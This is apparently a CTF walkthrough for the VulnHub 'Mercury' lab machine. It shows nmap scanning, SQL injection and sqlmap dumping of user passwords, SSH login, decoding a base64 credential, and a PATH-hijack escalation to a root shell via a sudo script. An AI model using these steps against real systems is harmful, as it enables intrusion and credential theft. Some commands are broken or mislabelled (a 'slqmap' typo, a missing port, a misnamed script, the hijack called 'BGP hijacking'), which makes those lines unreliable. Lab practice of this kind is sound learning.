# Mercury

You can set up this machine with a ```BRIDGED ADAPTER``` or a ```NAT NETWORK``` !

Start by enumerating the system !
```
sudo nmap -sS -p- --open --min-rate 5000 -Pn -n -v 192.168.1.20 -oG allPorts
```

Let's find out all services and versions
```
nmap -sC -sV -p22,8080 192.168.1.20 -oN targeted
```
 
Can't do anything with the ```22``` port, but the scan shows that a ```robot.txt``` file exists in the ```8080``` port !
```
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
| http-robots.txt: 1 disallowed entry
|_/
```

In the ```http://192.168.1.20:8080/robots.txt``` we have this output !
```
User-agent: * 
Disallow: /
```

There's no a specific directory so let's try with ```*```
```
curl "http://192.168.1.20:8080/*" -k
```
> You can enter the link on your browser too

We have a Django problem... But that shows useful information !
```
[name='index']
robots.txt [name='robots']
mercuryfacts/
```

There's a ```/mercuryfacts/``` directory ! let's see it
```
curl http://192.168.1.20:8080/mercuryfacts/ -k
```
> Or just in your browser ```http://192.168.1.20:8080/mercuryfacts/```

We have got the main page ! There's so other linked pages 
```
Mercury Facts: Load a fact -> http://192.168.1.20:8080/mercuryfacts/1/
Website Todo List: See List -> http://192.168.1.20:8080/mercuryfacts/todo
```

In the ```Todo List``` page, we see that the page use ```mysql``` !
```
Still todo:
    ...
    Use models in django instead of direct mysql call
    ...
```

At the same time, in the ```Mercury Facts``` page, the link seems to be a mysql query
```
http://192.168.1.20:8080/mercuryfacts/1/
```
> The **/1/** argument, seems to exploitable !

Let's try some SQL injection : ```1 or 1=1-- -``` !
```
curl "http://192.168.1.20:8080/mercuryfacts/1%20or%201=1--%20-/" -k
```
> Url-encode de blank spaces replacing ``` ``` by ```%20``` !

The following oupt confirms it's exploitable !
```
Fact id: 1 or 1=1-- -. (('Mercury does not have any moons or rings.',), ('Mercury is the smallest planet.',), ('Mercury is the closest planet to the Sun.',), ('Your weight on Mercury would be 38% of your weight on Earth.',), ('A day on the surface of Mercury lasts 176 Earth days.',), ('A year on Mercury takes 88 Earth days.',), ("It's not known who discovered Mercury.",), ('A year on Mercury is just 88 days long.',))
```

So, let's discover Databases and tables !
```
slqmap -u http://192.168.1.20/mercuryfacts/ --dbs --batch
```

There's a ```mercuty``` database !
```
available databases [2]:
[*] information_schema
[*] mercury
```

Let's see all tables from this database
```
sqlmap -u http://192.168.1.20/mercuryfacts/ -D mercury --tables --batch
```

There's a ```users``` table !
```
[2 tables]
+-------+
| facts |
| users |
+-------+
```

Check its content !
```
sqlmap -u http://192.168.1.20/mercuryfacts/ -D mercury -T users --dump --batch
```

Save the columns for possible ssh logins !
```
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
```

Connect use ```webmaster``` via ```ssh``` to the server !
```
ssh webmaster@192.168.1.20
```
> Enter the password !

We are in !
```
webmaster@mercury:~$ whoami
webmaster
```

See the ```user_flag``` at ```/home/webmaster/user_flag.txt``` !
```
[user_flag_8339915c9a454657bd60ee58776f4ccd]
```

Let's see if we have sudo privileges!
```
sudo -l
```
> No sudo privileges...

In the home directory, there's an interessting directory ```mecury_proj```, let's enumerate it !
```
webmaster@mercury:~$ cd mercury_proj/
webmaster@mercury:~/mercury_proj$ ls
db.sqlite3  manage.py  mercury_facts  mercury_index  mercury_proj  notes.txt
```

We find useful information in the```notes.txt``` file !
```
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

There's a user called ```linuxmaster```, and its password is encoded in ```base64```
```
echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
```

We've got the ```linuxmaster``` credential !
```
user: linuxmaster
pass: mercurymeandiameteris4880km
```

let's change of user !
```
su linuxmaster
```
> Enter the decoded password

Great, we're a ```linuxmaster``` !
```
linuxmaster@mercury:~$ whoami
linuxmaster
```

Check for sudo privileges
```
sudo -l
```

interesting privileges !
```
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```

let's analyse the ```/usr/bin/check_syslog.sh``` script
```
#!/bin/bash
tail -n 10 /var/log/syslog
```

The script shows the ```tail``` command in a relative path. We are going to use a ```BGP hijacking``` attack ! For that, let's change some Environment Variables !
> in /home/linuxmaster/
```
ln -s /usr/bin/vim tail
export PATH=$(pwd):$PATH
```
Let's execute the script !
```
sudo --perserve-env=PATH /usr/bin/checkgid_syslog.sh
```

This last command will show up a ```vim```, enter this command in the footer !
```
:!/bin/bash
```

We got to root !
```
root@mercury:/home/linuxmaster# whoami
root
```

Find the flag in ```/root/root_flag.txt```
```
...
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```

Machine link: [VulnHub](https://www.vulnhub.com/entry/the-planets-mercury,544/)

